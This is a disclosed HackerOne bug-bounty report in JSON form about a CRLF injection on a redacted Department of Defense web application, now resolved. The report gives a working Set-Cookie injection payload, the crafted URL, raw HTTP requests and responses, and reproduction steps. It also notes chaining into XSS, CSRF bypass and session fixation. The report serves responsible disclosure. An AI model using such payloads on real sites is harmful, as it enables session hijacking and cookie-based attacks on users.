{
  "id": 245485,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDU0ODU=",
  "url": "https://hackerone.com/reports/245485",
  "title": "CRLF Injection on ███████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-07-03T09:53:59.590Z",
  "submitted_at": "2017-07-03T09:53:59.590Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "twicedi",
    "url": "/twicedi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-12-02T19:01:30.276Z",
  "bug_reporter_agreed_on_going_public_at": "2017-10-11T18:32:28.883Z",
  "team_member_agreed_on_going_public_at": "2019-12-02T19:01:30.200Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nThe web application hosted on the \"█████\" domain is affected by a carriage return line feeds (CRLF) injection vulnerability that could be used in combination with others. This issue could allow XSS via Cookie, bypass Double Submit Cookie csrf protection or Session Fixation on .█████████ domains web apps.\n\n**Description:**\nA CRLF Injection attack occurs when an attacker manages to submit a CRLF into an application. \nThese two special characters represent the End of Line (EOL) marker for many internet protocols, including HTTP. Web applications typically split headers based on where the CRLF character sequence is found. Therefore, if a malicious user is able to inject their own CRLF sequence into an HTTP stream, they gain control over the contents of the HTTP response.\nIn this case this is could be done by modifying an HTTP request directed to the \"███\" adding, for example, the following payload:\n\n> %0D%0ASet-Cookie:test2=test;domain=.████\n\nWith the preceding payload, an attacker is going to set, on the victim's browser that is visiting the malicious URL, a new cookie with an arbitrary value. Note that the scope of this cookie include all \".█████\" subdomains, so this cookie is going to be sent, by the browser, to all the subdomains.\n\nURL: http://████/advanced%0D%0ASet-Cookie:test2=test;domain=.█████\n\nGenerated request:\n```\nGET /advanced%0D%0ASet-Cookie:test2=test;domain=.████ HTTP/1.1\nHost: ██████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse (note the \"Set-Cookie\" header):\n```\nHTTP/1.1 302 Found\nDate: Mon, 03 Jul 2017 08:55:53 GMT\nServer: Apache\nLocation: http://www.█████████:80/advanced\nContent-Length: 267\nContent-Type: text/html; charset=iso-8859-1\nmy_cache-control: no-cache\nmy_pragma: no-cache\nConnection: close\nSet-Cookie: test2=test;domain=.█████████\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href=\"http://www.███:80/advanced\nSet-Cookie:test2=test;domain=.█████████\">here</a>.</p>\n</body></html>\n```\n\nAt this poin the new cookie is set on the browser, and it is going to be sent in every request, as showed in the following examples.\n\nRequest to the same subdomain ( http://www.███████/advanced ):\n```\nGET /advanced HTTP/1.1\nHost: www.██████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: */*\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=F48C86E41595456012C5228F2A807BCC; test2=test\nConnection: close\n```\n\nRequest to another █████████ subdomain ( http://www.█████ ):\n```\nGET / HTTP/1.1\nHost: www.█████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nCookie: test2=test\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\n## Impact\nThis vulnerability could be chained with other issues allowing for example:\n1) XSS via Cookie: for example in case in which the value of the cookie is reflected somewhere without output encoding\n2) bypass Double Submit Cookie CSRF protection: in case in which an application use this solution as CSRF protection\n3) Session Fixation: if an application is not renewing the session cookie (for example JSESSIONID) after the login.\nNote that, in the preceding example, it is showed how an attacker could set an arbirtary cookie valid for all the .███████ subdomains so, after the cookie is set, the exploitation could be carried on other subdomains.\n\n## Step-by-step Reproduction Instructions\n\n1. Open the following URL with Firefox: http://██████/advanced%0D%0ASet-Cookie:test2=test;domain=.██████████\n2. A new cookie is going to be set\n3. This cookie is going to be sent on all the .█████████ subdomains\n\n## Product, Version, and Configuration (If applicable)\nThe exploitability of the issue has been tested with the latest version (at the time of writing) of the following browsers:\n\n> Firefox (v54.0)\n> Microsoft Edge\n\n## Suggested Mitigation/Remediation Actions\nTo mitigate this issue, the application should strip out any input which contains the **%0D%0A** URL encoded characters.\n\nI'm available for further clarification,\n\nBest,\nDavide",
  "weakness": {
    "id": 69,
    "name": "CRLF Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 4,
  "voters": [
    "wisp",
    "impramodsargar",
    "collinsmarra",
    "titan_shivansh"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
